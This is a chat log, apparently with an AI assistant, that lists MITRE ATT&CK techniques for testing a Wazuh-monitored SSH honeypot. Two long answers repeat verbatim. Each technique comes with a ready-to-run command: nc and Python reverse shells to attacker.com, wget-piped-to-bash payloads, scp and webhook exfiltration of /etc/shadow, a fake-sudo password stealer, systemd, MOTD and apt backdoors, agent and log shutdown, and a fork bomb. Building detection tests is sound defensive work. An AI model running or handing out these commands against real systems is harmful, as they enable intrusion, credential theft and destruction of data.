based on MITRE ATT&CK what give me an additional 20 attacks that can me implemented

▸ Thought for 9s, 1.4k tokens
  Prioritizing Tool Usage
  Here are 20 additional attacks you can simulate in your honeypot script, broken down by their MITRE ATT&CK tactics. Adding these to simulate_attacks.py will
  give you a highly comprehensive test suite for your Wazuh SIEM.

  ### Execution

  1. Scheduled Task (at) — T1053.002 Scheduled Task/Job: At

  • Command: echo "nc -e /bin/sh attacker.com 4444" | at now + 1 minute
  • What it tests: Detects the use of the at daemon to schedule delayed reverse shells.

  2. Shell Configuration Execution — T1059.004 Command and Scripting Interpreter: Unix Shell

  • Command: echo "exec /bin/sh" > /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh
  • What it tests: Catching scripts executing from world-writable directories like /tmp.

  ### Persistence

  3. Systemd Service Creation — T1543.002 Create or Modify System Process: Systemd Service

  • Command: echo -e "[Service]\nExecStart=/bin/nc -e /bin/sh attacker.com 4444" > /etc/systemd/system/backdoor.service && systemctl daemon-reload
  • What it tests: FIM detecting new files in /etc/systemd/system/ and SIEM catching daemon-reload.

  4. Profile Drop-in Scripts — T1546.004 Event Triggered Execution: Unix Shell Configuration Modification

  • Command: echo "alias sudo='sudo /tmp/malicious.sh'" > /etc/profile.d/update.sh
  • What it tests: Global profile hijacking. Any login by any user will trigger the malicious alias.

  5. Sudo Group Addition — T1136.001 Create Account: Local Account

  • Command: usermod -aG sudo sysadmin_bckp
  • What it tests: Catching unauthorized users being added to privileged groups via usermod or gpasswd.

  ### Privilege Escalation

  6. SUID Binary Creation — T1548.001 Abuse Elevation Control Mechanism: Setuid and Setgid

  • Command: cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash
  • What it tests: SIEM rules triggering on chmod commands that set the dangerous SUID bit (+s or 4755).

  7. Sudo Permissions Check — T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching

  • Command: sudo -l
  • What it tests: Detecting automated enumeration scripts (like LinPEAS) checking what commands the current user can run as root.

  8. Ptrace/Strace Attachment — T1055.008 Process Injection: Ptrace System Calls

  • Command: strace -p 1
  • What it tests: Catching an attacker trying to attach a debugger to systemd or other root processes to dump memory.

  ### Defense Evasion

  9. Clearing Bash History — T1070.003 Indicator Removal: Clear Command History

  • Command: cat /dev/null > ~/.bash_history && history -c
  • What it tests: Detecting common commands used to wipe forensic trails from the terminal.

  10. Secure File Deletion — T1070.004 Indicator Removal: File Deletion

  • Command: shred -u /tmp/eicar.com.txt
  • What it tests: Attackers securely wiping their malware. Detects the execution of shred or wipe.

  11. Impair Defenses (Agent Kill) — T1562.001 Impair Defenses: Disable or Modify Tools

  • Command: systemctl stop wazuh-agent || killall wazuh-agent
  • What it tests: The SIEM should trigger a critical alert if the security agent goes offline or a stop command is issued.

  12. Weakening File Permissions — T1222.002 File and Directory Permissions Modification

  • Command: chmod 777 /etc/shadow
  • What it tests: FIM detecting critical system files having their permissions weakened, exposing passwords to all users.

  ### Credential Access

  13. Bash History Grepping — T1552.003 Unsecured Credentials: Bash History

  • Command: grep -i -E 'password|pass|pwd' ~/.bash_history
  • What it tests: Detecting attackers hunting for cleartext passwords typed accidentally in the terminal.

  14. Private Key Hunting — T1552.004 Unsecured Credentials: Private Keys

  • Command: find / -name "*.pem" -o -name "id_rsa" 2>/dev/null
  • What it tests: Detecting sweeping searches across the file system specifically looking for SSH private keys.
  15. Shadow File Unshadowing — T1003.008 OS Credential Dumping: /etc/passwd and /etc/shadow

  • Command: cat /etc/passwd > /tmp/p.txt && cat /etc/shadow > /tmp/s.txt && unshadow /tmp/p.txt /tmp/s.txt
  • What it tests: Preparing system hashes for offline cracking (John the Ripper prep).
  ### Discovery

  16. Network Connection Discovery — T1049 System Network Connections Discovery

  • Command: netstat -antp || ss -tulpn
  • What it tests: Enumeration of internal listening ports to figure out what else is running on the honeypot.

  17. Local Account Discovery — T1087.001 Account Discovery: Local Account

  • Command: cat /etc/passwd | grep -E "/bin/bash|/bin/sh"
  • What it tests: Filtering out system accounts to find real, login-capable users to target.

  18. Process Discovery — T1057 Process Discovery

  • Command: ps auxww or top -n 1
  • What it tests: Gathering a full list of running processes to find security tools or target applications.

  ### Lateral Movement & Exfiltration

  19. Outbound SSH Attempt — T1021.004 Remote Services: SSH

  • Command: ssh -o StrictHostKeyChecking=no fakeuser@172.18.0.1
  • What it tests: Detecting if the honeypot attempts to initiate an outbound SSH connection to the Docker bridge or other containers (a major red flag).

  20. Exfiltration via SCP — T1048.002 Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
  • Command: scp /etc/shadow attacker@attacker.com:/tmp/
  • What it tests: Detecting outbound file transfers using secure copy, indicating data is leaving the network.

────────────────────────────────────────────────────────────
> give me additional 30
▸ Thought for 7s
  Prioritizing Tool Usage
  Here are an additional 30 advanced attacks you can integrate into your honeypot simulation, mapped to the MITRE ATT&CK framework. These will significantly
  broaden the scope of your Wazuh SIEM rules.

  ### Execution

  21. In-Memory Execution (Fileless) — T1059.004 Command and Scripting Interpreter: Unix Shell

  • Command: wget -qO- https://attacker.com/payload.sh | bash
  • What it tests: Downloading and executing a script directly in memory without ever writing it to the disk.

  22. Python Reverse Shell — T1059.006 Command and Scripting Interpreter: Python

  • Command: python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.
  fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
  • What it tests: Attackers bypassing shell monitoring by using python to spawn a raw interactive shell.
  23. Perl One-Liner Execution — T1059.006 Command and Scripting Interpreter: Perl

  • Command: perl -e 'exec "/bin/sh";'
  • What it tests: Execution of arbitrary shells through the Perl interpreter.
  24. Base64 Obfuscated Execution — T1027 Obfuscated Files or Information

  • Command: echo "d2hvYW1p" | base64 -d | sh
  • What it tests: Using Base64 decoding to hide the actual command (whoami) from basic command-line monitoring.

  ### Persistence
  25. MOTD (Message of the Day) Backdoor — T1546.004 Event Triggered Execution: Unix Shell Configuration Modification

  • Command: echo "nc -e /bin/sh attacker.com 4444 &" >> /etc/update-motd.d/00-header
  • What it tests: Triggering a payload every time any user logs in and the system prints the welcome message.
  26. SSHRC Persistence — T1546.004 Event Triggered Execution: Unix Shell Configuration Modification

  • Command: echo "nc -e /bin/sh attacker.com 4444 &" > /etc/ssh/sshrc
  • What it tests: A lesser-known SSH config file that executes code every time someone logs in via SSH.
  27. rc.local Modification — T1547.001 Boot or Logon Autostart Execution: rc.common / rc.local

  • Command: echo "/tmp/payload.sh &" >> /etc/rc.local
  • What it tests: Legacy boot persistence. The payload will run as root on the next system reboot.
  28. Backdooring apt Package Manager — T1546.015 Event Triggered Execution: Component Firmware

  • Command: echo 'APT::Update::Pre-Invoke {"/tmp/malicious.sh";};' > /etc/apt/apt.conf.d/99backdoor
  • What it tests: Execution of malware every time an administrator runs apt update.
  ### Privilege Escalation

  29. Docker Socket Abuse — T1611 Escape to Host

  • Command: docker run -v /:/mnt --rm -it alpine chroot /mnt
  • What it tests: If the Docker socket is mounted, this command breaks out of the container and drops the attacker into the host operating system as root.
  30. LD_PRELOAD Hijacking — T1574.006 Hijack Execution Flow: Dynamic Linker Hijacking

  • Command: echo 'export LD_PRELOAD=/tmp/malicious.so' >> ~/.bashrc
  • What it tests: Forcing all executed programs to load a malicious shared object, allowing userland rootkits.
  31. Sudo Caching Token Reuse — T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching

  • Command: sudo -n true
  • What it tests: Checking if a user recently ran sudo and left their authentication token cached (allowing root access without a password).
  32. Abusing File Capabilities — T1548.001 Abuse Elevation Control Mechanism: Setuid and Setgid

  • Command: getcap -r / 2>/dev/null
  • What it tests: Scanning the system for binaries with special capabilities (like cap_dac_read_search) that can bypass file read permissions.

  ### Defense Evasion
  33. Stopping Auditd/Syslog — T1562.001 Impair Defenses: Disable or Modify Tools

  • Command: systemctl stop rsyslog || service rsyslog stop
  • What it tests: Silencing the system logging daemons to prevent Wazuh from reading local logs.
  34. Hiding Files in /dev/shm — T1564.001 Hide Artifacts: Hidden Files and Directories

  • Command: wget -O /dev/shm/.hidden_miner https://attacker.com/miner && chmod +x /dev/shm/.hidden_miner
  • What it tests: Dropping malware into RAM-backed storage (/dev/shm) so it disappears entirely upon reboot.
  35. Clearing wtmp and btmp — T1070.002 Indicator Removal: Clear Linux or Mac System Logs

  • Command: cat /dev/null > /var/log/wtmp && cat /dev/null > /var/log/btmp
  • What it tests: Wiping the binary logs that track successful and failed user logins.
  36. Blocking Security Feeds — T1562.001 Impair Defenses: Disable or Modify Tools

  • Command: echo "127.0.0.1 virustotal.com" >> /etc/hosts
  • What it tests: Altering the hosts file to blackhole DNS requests to security vendors or threat intelligence APIs.
  37. Disabling AppArmor/SELinux — T1562.001 Impair Defenses: Disable or Modify Tools

  • Command: setenforce 0 || systemctl stop apparmor
  • What it tests: Disabling mandatory access control systems to allow exploits to run freely.

  ### Credential Access
  38. Sudo Wrapper (Keylogger) — T1056.001 Input Capture: Keylogging

  • Command: echo "alias sudo='read -s -p \"[sudo] password for \$USER: \" p; echo \$p >> /tmp/.pass; unalias sudo; sudo'" >> ~/.bashrc
  • What it tests: A classic social engineering trick. Creates a fake sudo prompt that steals the password, saves it to /tmp/.pass, and then runs the real sudo.
  39. SSH Agent Hijacking — T1556 Modify Authentication Process

  • Command: find /tmp/ -type s -name "agent.*" 2>/dev/null
  • What it tests: Searching for active SSH agent sockets to hijack forwarded SSH keys from administrators.
  40. Config File Password Hunting — T1552.001 Unsecured Credentials: Credentials In Files

  • Command: grep -rnw '/etc/' -e 'DB_PASSWORD' -e 'DB_PASS'
  • What it tests: Grepping configuration directories for hardcoded database credentials.

  ### Discovery
  41. Internal Subnet ARP Scan — T1016 System Network Configuration Discovery

  • Command: arp -a
  • What it tests: Checking the ARP cache to map out other machines on the local network that the honeypot has spoken to.
  42. Routing Table Discovery — T1016 System Network Configuration Discovery

  • Command: route -n || ip route
  • What it tests: Discovering the default gateway and internal subnets.

  43. Installed Software Discovery — T1518 Software Discovery

  • Command: dpkg -l || rpm -qa
  • What it tests: Dumping a list of all installed packages to look for vulnerable outdated software.

  44. Security Tool Discovery — T1518.001 Software Discovery: Security Software Discovery

  • Command: ps aux | grep -i 'wazuh\|ossec\|auditd\|suricata'
  • What it tests: Attackers checking if they are being monitored by specific security agents.

  45. Mounted Drives Discovery — T1120 Peripheral Device Discovery

  • Command: df -h || mount
  • What it tests: Looking for mounted network drives (NFS/SMB) that might contain sensitive data.

  ### Lateral Movement & Exfiltration

  46. Ping Sweep (ICMP) — T1018 Remote System Discovery

  • Command: for i in {1..254}; do ping -c 1 -W 1 172.18.0.$i | grep 'from'; done
  • What it tests: A noisy bash-based ping sweep of the Docker subnet. (Should trigger network IDS rules).

  47. SSH Reverse Tunneling — T1090.001 Proxy: Internal Proxy

  • Command: ssh -R 8080:127.0.0.1:80 attacker@attacker.com
  • What it tests: Opening a reverse proxy to expose internal honeypot services directly to the attacker.

  48. Webhook Exfiltration — T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage

  • Command: curl -X POST -d @/etc/shadow https://webhook.site/malicious-endpoint
  • What it tests: Exfiltrating sensitive files via standard HTTPS POST requests.

  ### Impact

  49. Fork Bomb (Denial of Service) — T1499.004 Endpoint Denial of Service: Resource Exhaustion

  • Command: :(){ :|:& };:
  • What it tests: A classic bash command that infinitely replicates itself, instantly consuming all CPU and RAM until the machine crashes.

  50. Defacement — T1491.001 Defacement: Internal Defacement

  • Command: echo "YOU HAVE BEEN HACKED" > /etc/motd
  • What it tests: Altering the login banner to explicitly notify users of a compromise.


  Right now, your attack script is simulating a very classic "smash and grab" (SSH brute force -> dump passwords -> drop payload -> clear logs). Since your
  honeypot is a real Ubuntu container with a Wazuh agent and File Integrity Monitoring (FIM) active, there are several other fantastic attack paths you could
  implement to test the SIEM's detection capabilities.

  Here are a few advanced attacks you could easily add to the honeypot or script:

  ### 1. Cryptojacking Simulation (Impact)

  The Attack: Attackers frequently breach SSH honeypots just to install Monero miners.
  How to simulate: After logging in, have the script download a fake xmrig binary and run a command that intentionally spikes the CPU (e.g., running dd
  if=/dev/urandom of=/dev/null &).
  What it tests: You can configure Wazuh to trigger a high-severity alert when CPU usage suddenly spikes above 90%, paired with the execution of a suspicious
  binary name.

  ### 2. Ransomware & Mass File Modification (Impact/FIM)

  The Attack: A script encrypts user data and drops a ransom note.
  How to simulate: Have the red team script use tar or openssl to rapidly zip and "encrypt" files in /home/, followed by deleting the originals and dropping a
  README_RECOVER.txt.
  What it tests: Wazuh's FIM (File Integrity Monitoring) will go crazy seeing rapid file deletions and creations in a monitored directory. You can write a custom
  SIEM rule that fires when README_RECOVER.txt is detected.

  ### 3. DNS Exfiltration (Command & Control)

  The Attack: Stealing data without using standard web traffic to avoid network firewalls.
  How to simulate: Have the script read /etc/shadow, encode it in base64, and attempt to resolve it as a fake subdomain using dig or nslookup (e.g., nslookup
  c2FsdGVkX3Bhc3N3b3Jk.attacker.com).
  What it tests: Tests if your SIEM or network monitoring can catch abnormally long DNS queries or the use of nslookup/dig by an unprivileged user.

  ### 4. Cronjob Persistence (Persistence)

  The Attack: The attacker ensures they survive a reboot.
  How to simulate: Instead of just creating a user account (which you already do), have the script drop a reverse shell command into /etc/cron.d/malicious or
  append it to the root crontab.
  What it tests: FIM will instantly detect a new file in /etc/cron.d/. You can also write a Wazuh rule to detect the execution of crontab -e.

  ### 5. Internal Network Recon (Lateral Movement)

  The Attack: The attacker uses the honeypot as a beachhead to scan the internal corporate network (the Docker network).
  How to simulate: Run ping -c 1 wazuh.manager or download and run a quick nmap scan against the local 172.18.0.0/16 Docker subnet.
  What it tests: You can test Wazuh's ability to detect lateral movement tools being downloaded, or set up Suricata (Network IDS) later to catch the internal port
  sweep.

  Any of these sound like fun additions once you finish your current updates?

────────────────────────────────────────────────────────────
> what else

▸ Thought for 2s, 606 tokens
  Prioritizing Tool Usage
  Here are a few more advanced attack scenarios that you can simulate, focusing on different parts of the MITRE ATT&CK framework and really testing Wazuh's deep
  system monitoring:

  ### 6. SSH Key Manipulation (Persistence)

  The Attack: Instead of relying on a password that might be changed, the attacker drops their own SSH key onto the server to guarantee they can always get back
  in.
  How to simulate: Have your red team script run mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3Nza... attacker@kali" >> /root/.ssh/authorized_keys.
  What it tests: Wazuh's File Integrity Monitoring (FIM) should be configured to strictly monitor /root/.ssh/. You can create a critical alert if authorized_keys
  is ever modified.

  ### 7. Timestomping (Defense Evasion)

  The Attack: Attackers alter the creation/modification dates of their malware to make it look like an old, legitimate system file.
  How to simulate: Have the script touch a file, then artificially change its date to years ago: touch -d '2015-01-01 12:00:00' /tmp/systemd-update.
  What it tests: Tests if your SIEM rules are advanced enough to catch the execution of the touch command with time-modification flags (using Wazuh's command
  monitoring or Auditd integration).

  ### 8. Data Staging & Archiving (Collection)

  The Attack: Before exfiltrating data, attackers usually compress all the interesting files they found into one hidden archive.
  How to simulate: Have the script aggressively search for and compress logs and config files into a hidden .tar.gz file in the tmp directory: tar -czf
  /tmp/.system_backup.tar.gz /etc/ /var/log/.
  What it tests: You can write a rule that detects the use of archiving tools (tar, zip) combined with hidden file prefixes (.) in world-writable directories like
  /tmp.

  ### 9. Hijacking .bashrc or .profile (Persistence)

  The Attack: The attacker modifies a user's terminal profile so that every time a legitimate admin logs in, a backdoor is triggered in the background.
  How to simulate: Have the script append a harmless reverse-shell attempt to the .bashrc: echo "(nc -e /bin/sh attacker.com 4444 &)" >> /root/.bashrc.
  What it tests: FIM should instantly flag modifications to user profile files.

  ### 10. Living off the Land / LOLBins (Defense Evasion)

  The Attack: Using built-in, trusted Linux binaries to do malicious things so they aren't blocked by antivirus.
  How to simulate: Have the script download a file using awk or python3 instead of curl or wget. Or use base64 to decode a script directly into bash without
  saving it to disk: echo "d2hvYW1p" | base64 -d | sh.
  What it tests: Tests your ability to build SIEM rules based on anomalous command-line arguments for standard binaries, rather than just relying on catching
  known malware signatures.

  ### 11. SUID Privilege Escalation (Privilege Escalation)

  The Attack: Hunting for misconfigured files that run as root.
  How to simulate: The attacker runs a sweeping search across the disk looking for SUID binaries: find / -perm -4000 -type f 2>/dev/null.
  What it tests: Wazuh can be configured to monitor processes. Running a sweeping find command for SUID binaries is a massive red flag and a classic signature of
  automated privilege escalation enumeration tools like LinPEAS.

────────────────────────────────────────────────────────────
> based on MITRE ATT&CK what give me an additional 20 attacks that can me implemented

▸ Thought for 9s, 1.4k tokens
  Prioritizing Tool Usage
  Here are 20 additional attacks you can simulate in your honeypot script, broken down by their MITRE ATT&CK tactics. Adding these to simulate_attacks.py will
  give you a highly comprehensive test suite for your Wazuh SIEM.

  ### Execution

  1. Scheduled Task (at) — T1053.002 Scheduled Task/Job: At

  • Command: echo "nc -e /bin/sh attacker.com 4444" | at now + 1 minute
  • What it tests: Detects the use of the at daemon to schedule delayed reverse shells.

  2. Shell Configuration Execution — T1059.004 Command and Scripting Interpreter: Unix Shell

  • Command: echo "exec /bin/sh" > /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh
  • What it tests: Catching scripts executing from world-writable directories like /tmp.

  ### Persistence

  3. Systemd Service Creation — T1543.002 Create or Modify System Process: Systemd Service

  • Command: echo -e "[Service]\nExecStart=/bin/nc -e /bin/sh attacker.com 4444" > /etc/systemd/system/backdoor.service && systemctl daemon-reload
  • What it tests: FIM detecting new files in /etc/systemd/system/ and SIEM catching daemon-reload.

  4. Profile Drop-in Scripts — T1546.004 Event Triggered Execution: Unix Shell Configuration Modification

  • Command: echo "alias sudo='sudo /tmp/malicious.sh'" > /etc/profile.d/update.sh
  • What it tests: Global profile hijacking. Any login by any user will trigger the malicious alias.

  5. Sudo Group Addition — T1136.001 Create Account: Local Account

  • Command: usermod -aG sudo sysadmin_bckp
  • What it tests: Catching unauthorized users being added to privileged groups via usermod or gpasswd.

  ### Privilege Escalation

  6. SUID Binary Creation — T1548.001 Abuse Elevation Control Mechanism: Setuid and Setgid

  • Command: cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash
  • What it tests: SIEM rules triggering on chmod commands that set the dangerous SUID bit (+s or 4755).

  7. Sudo Permissions Check — T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching

  • Command: sudo -l
  • What it tests: Detecting automated enumeration scripts (like LinPEAS) checking what commands the current user can run as root.

  8. Ptrace/Strace Attachment — T1055.008 Process Injection: Ptrace System Calls

  • Command: strace -p 1
  • What it tests: Catching an attacker trying to attach a debugger to systemd or other root processes to dump memory.

  ### Defense Evasion

  9. Clearing Bash History — T1070.003 Indicator Removal: Clear Command History

  • Command: cat /dev/null > ~/.bash_history && history -c
  • What it tests: Detecting common commands used to wipe forensic trails from the terminal.

  10. Secure File Deletion — T1070.004 Indicator Removal: File Deletion

  • Command: shred -u /tmp/eicar.com.txt
  • What it tests: Attackers securely wiping their malware. Detects the execution of shred or wipe.

  11. Impair Defenses (Agent Kill) — T1562.001 Impair Defenses: Disable or Modify Tools

  • Command: systemctl stop wazuh-agent || killall wazuh-agent
  • What it tests: The SIEM should trigger a critical alert if the security agent goes offline or a stop command is issued.

  12. Weakening File Permissions — T1222.002 File and Directory Permissions Modification

  • Command: chmod 777 /etc/shadow
  • What it tests: FIM detecting critical system files having their permissions weakened, exposing passwords to all users.

  ### Credential Access

  13. Bash History Grepping — T1552.003 Unsecured Credentials: Bash History

  • Command: grep -i -E 'password|pass|pwd' ~/.bash_history
  • What it tests: Detecting attackers hunting for cleartext passwords typed accidentally in the terminal.

  14. Private Key Hunting — T1552.004 Unsecured Credentials: Private Keys

  • Command: find / -name "*.pem" -o -name "id_rsa" 2>/dev/null
  • What it tests: Detecting sweeping searches across the file system specifically looking for SSH private keys.
  15. Shadow File Unshadowing — T1003.008 OS Credential Dumping: /etc/passwd and /etc/shadow

  • Command: cat /etc/passwd > /tmp/p.txt && cat /etc/shadow > /tmp/s.txt && unshadow /tmp/p.txt /tmp/s.txt
  • What it tests: Preparing system hashes for offline cracking (John the Ripper prep).
  ### Discovery

  16. Network Connection Discovery — T1049 System Network Connections Discovery

  • Command: netstat -antp || ss -tulpn
  • What it tests: Enumeration of internal listening ports to figure out what else is running on the honeypot.

  17. Local Account Discovery — T1087.001 Account Discovery: Local Account

  • Command: cat /etc/passwd | grep -E "/bin/bash|/bin/sh"
  • What it tests: Filtering out system accounts to find real, login-capable users to target.

  18. Process Discovery — T1057 Process Discovery

  • Command: ps auxww or top -n 1
  • What it tests: Gathering a full list of running processes to find security tools or target applications.

  ### Lateral Movement & Exfiltration

  19. Outbound SSH Attempt — T1021.004 Remote Services: SSH

  • Command: ssh -o StrictHostKeyChecking=no fakeuser@172.18.0.1
  • What it tests: Detecting if the honeypot attempts to initiate an outbound SSH connection to the Docker bridge or other containers (a major red flag).

  20. Exfiltration via SCP — T1048.002 Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
  • Command: scp /etc/shadow attacker@attacker.com:/tmp/
  • What it tests: Detecting outbound file transfers using secure copy, indicating data is leaving the network.

────────────────────────────────────────────────────────────
> give me additional 30
▸ Thought for 7s
  Prioritizing Tool Usage
  Here are an additional 30 advanced attacks you can integrate into your honeypot simulation, mapped to the MITRE ATT&CK framework. These will significantly
  broaden the scope of your Wazuh SIEM rules.

  ### Execution

  21. In-Memory Execution (Fileless) — T1059.004 Command and Scripting Interpreter: Unix Shell

  • Command: wget -qO- https://attacker.com/payload.sh | bash
  • What it tests: Downloading and executing a script directly in memory without ever writing it to the disk.

  22. Python Reverse Shell — T1059.006 Command and Scripting Interpreter: Python

  • Command: python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.
  fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
  • What it tests: Attackers bypassing shell monitoring by using python to spawn a raw interactive shell.
  23. Perl One-Liner Execution — T1059.006 Command and Scripting Interpreter: Perl

  • Command: perl -e 'exec "/bin/sh";'
  • What it tests: Execution of arbitrary shells through the Perl interpreter.
  24. Base64 Obfuscated Execution — T1027 Obfuscated Files or Information

  • Command: echo "d2hvYW1p" | base64 -d | sh
  • What it tests: Using Base64 decoding to hide the actual command (whoami) from basic command-line monitoring.

  ### Persistence
  25. MOTD (Message of the Day) Backdoor — T1546.004 Event Triggered Execution: Unix Shell Configuration Modification

  • Command: echo "nc -e /bin/sh attacker.com 4444 &" >> /etc/update-motd.d/00-header
  • What it tests: Triggering a payload every time any user logs in and the system prints the welcome message.
  26. SSHRC Persistence — T1546.004 Event Triggered Execution: Unix Shell Configuration Modification

  • Command: echo "nc -e /bin/sh attacker.com 4444 &" > /etc/ssh/sshrc
  • What it tests: A lesser-known SSH config file that executes code every time someone logs in via SSH.
  27. rc.local Modification — T1547.001 Boot or Logon Autostart Execution: rc.common / rc.local

  • Command: echo "/tmp/payload.sh &" >> /etc/rc.local
  • What it tests: Legacy boot persistence. The payload will run as root on the next system reboot.
  28. Backdooring apt Package Manager — T1546.015 Event Triggered Execution: Component Firmware

  • Command: echo 'APT::Update::Pre-Invoke {"/tmp/malicious.sh";};' > /etc/apt/apt.conf.d/99backdoor
  • What it tests: Execution of malware every time an administrator runs apt update.
  ### Privilege Escalation

  29. Docker Socket Abuse — T1611 Escape to Host

  • Command: docker run -v /:/mnt --rm -it alpine chroot /mnt
  • What it tests: If the Docker socket is mounted, this command breaks out of the container and drops the attacker into the host operating system as root.
  30. LD_PRELOAD Hijacking — T1574.006 Hijack Execution Flow: Dynamic Linker Hijacking

  • Command: echo 'export LD_PRELOAD=/tmp/malicious.so' >> ~/.bashrc
  • What it tests: Forcing all executed programs to load a malicious shared object, allowing userland rootkits.
  31. Sudo Caching Token Reuse — T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching

  • Command: sudo -n true
  • What it tests: Checking if a user recently ran sudo and left their authentication token cached (allowing root access without a password).
  32. Abusing File Capabilities — T1548.001 Abuse Elevation Control Mechanism: Setuid and Setgid

  • Command: getcap -r / 2>/dev/null
  • What it tests: Scanning the system for binaries with special capabilities (like cap_dac_read_search) that can bypass file read permissions.

  ### Defense Evasion
  33. Stopping Auditd/Syslog — T1562.001 Impair Defenses: Disable or Modify Tools

  • Command: systemctl stop rsyslog || service rsyslog stop
  • What it tests: Silencing the system logging daemons to prevent Wazuh from reading local logs.
  34. Hiding Files in /dev/shm — T1564.001 Hide Artifacts: Hidden Files and Directories

  • Command: wget -O /dev/shm/.hidden_miner https://attacker.com/miner && chmod +x /dev/shm/.hidden_miner
  • What it tests: Dropping malware into RAM-backed storage (/dev/shm) so it disappears entirely upon reboot.
  35. Clearing wtmp and btmp — T1070.002 Indicator Removal: Clear Linux or Mac System Logs

  • Command: cat /dev/null > /var/log/wtmp && cat /dev/null > /var/log/btmp
  • What it tests: Wiping the binary logs that track successful and failed user logins.
  36. Blocking Security Feeds — T1562.001 Impair Defenses: Disable or Modify Tools

  • Command: echo "127.0.0.1 virustotal.com" >> /etc/hosts
  • What it tests: Altering the hosts file to blackhole DNS requests to security vendors or threat intelligence APIs.
  37. Disabling AppArmor/SELinux — T1562.001 Impair Defenses: Disable or Modify Tools

  • Command: setenforce 0 || systemctl stop apparmor
  • What it tests: Disabling mandatory access control systems to allow exploits to run freely.

  ### Credential Access
  38. Sudo Wrapper (Keylogger) — T1056.001 Input Capture: Keylogging

  • Command: echo "alias sudo='read -s -p \"[sudo] password for \$USER: \" p; echo \$p >> /tmp/.pass; unalias sudo; sudo'" >> ~/.bashrc
  • What it tests: A classic social engineering trick. Creates a fake sudo prompt that steals the password, saves it to /tmp/.pass, and then runs the real sudo.
  39. SSH Agent Hijacking — T1556 Modify Authentication Process

  • Command: find /tmp/ -type s -name "agent.*" 2>/dev/null
  • What it tests: Searching for active SSH agent sockets to hijack forwarded SSH keys from administrators.
  40. Config File Password Hunting — T1552.001 Unsecured Credentials: Credentials In Files

  • Command: grep -rnw '/etc/' -e 'DB_PASSWORD' -e 'DB_PASS'
  • What it tests: Grepping configuration directories for hardcoded database credentials.

  ### Discovery
  41. Internal Subnet ARP Scan — T1016 System Network Configuration Discovery

  • Command: arp -a
  • What it tests: Checking the ARP cache to map out other machines on the local network that the honeypot has spoken to.
  42. Routing Table Discovery — T1016 System Network Configuration Discovery

  • Command: route -n || ip route
  • What it tests: Discovering the default gateway and internal subnets.

  43. Installed Software Discovery — T1518 Software Discovery

  • Command: dpkg -l || rpm -qa
  • What it tests: Dumping a list of all installed packages to look for vulnerable outdated software.

  44. Security Tool Discovery — T1518.001 Software Discovery: Security Software Discovery

  • Command: ps aux | grep -i 'wazuh\|ossec\|auditd\|suricata'
  • What it tests: Attackers checking if they are being monitored by specific security agents.
  45. Mounted Drives Discovery — T1120 Peripheral Device Discovery

  • Command: df -h || mount
  • What it tests: Looking for mounted network drives (NFS/SMB) that might contain sensitive data.

  ### Lateral Movement & Exfiltration
  46. Ping Sweep (ICMP) — T1018 Remote System Discovery
  • Command: for i in {1..254}; do ping -c 1 -W 1 172.18.0.$i | grep 'from'; done
  • What it tests: A noisy bash-based ping sweep of the Docker subnet. (Should trigger network IDS rules).

  47. SSH Reverse Tunneling — T1090.001 Proxy: Internal Proxy
  • Command: ssh -R 8080:127.0.0.1:80 attacker@attacker.com
  • What it tests: Opening a reverse proxy to expose internal honeypot services directly to the attacker.
  48. Webhook Exfiltration — T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage
  • Command: curl -X POST -d @/etc/shadow https://webhook.site/malicious-endpoint
  • What it tests: Exfiltrating sensitive files via standard HTTPS POST requests.
  ### Impact

  49. Fork Bomb (Denial of Service) — T1499.004 Endpoint Denial of Service: Resource Exhaustion

  • Command: :(){ :|:& };:
  • What it tests: A classic bash command that infinitely replicates itself, instantly consuming all CPU and RAM until the machine crashes.
  50. Defacement — T1491.001 Defacement: Internal Defacement
  • Command: echo "YOU HAVE BEEN HACKED" > /etc/motd
  • What it tests: Altering the login banner to explicitly notify users of a compromise.
────────────────────────────────────────────────────────────
> give me 50 ssh attacks based on MITRE ATT&CK

▸ Thought for 5s
  Prioritizing Tool Usage
  Here are 50 SSH-specific attack techniques and simulations, mapped directly to the MITRE ATT&CK framework. These are highly specific to abusing the Secure Shell
  (SSH) protocol, the sshd daemon, and its configuration files.

  ### Reconnaissance & Initial Access

  1. SSH Brute Force (T1110.001): Repeatedly guessing passwords for root or common usernames.
  2. Password Spraying (T1110.003): Testing a single common password (like Summer2026!) across every user account on the SSH server.
  3. Default Credentials (T1078.001): Logging in with factory defaults like pi:raspberry or root:toor.
  4. Valid Accounts (Stolen Keys) (T1078.003): Using an unencrypted id_rsa private key stolen from a developer's machine to access the server.
  5. Exploit Public-Facing Application (SSH CVEs) (T1190): Exploiting known vulnerabilities in outdated OpenSSH versions (e.g., Terrapin or RegreSSHion).

  ### Execution

  6. Remote Command Execution (T1059.004): Executing commands immediately without spawning an interactive shell: ssh user@host 'whoami'.
  7. Local Script Execution via SSH (T1059.004): Pushing a local script to run on the remote honeypot in memory: ssh user@host 'bash -s' < local_script.sh.
  8. ProxyCommand Execution (T1059): Abusing the ProxyCommand directive in .ssh/config to execute local malware every time the user connects to a remote server.
  9. SSHPass Wrapper (T1059): Using sshpass -p 'password' ssh ... to script automated, non-interactive execution attacks.
  10. SSH over HTTP/WebSockets (T1102): Tunneling SSH traffic through web protocols (e.g., using corkscrew) to bypass firewall execution blocks.

  ### Persistence

  11. Rogue authorized_keys (T1098.004): Appending an attacker's public key to ~/.ssh/authorized_keys for passwordless reentry.
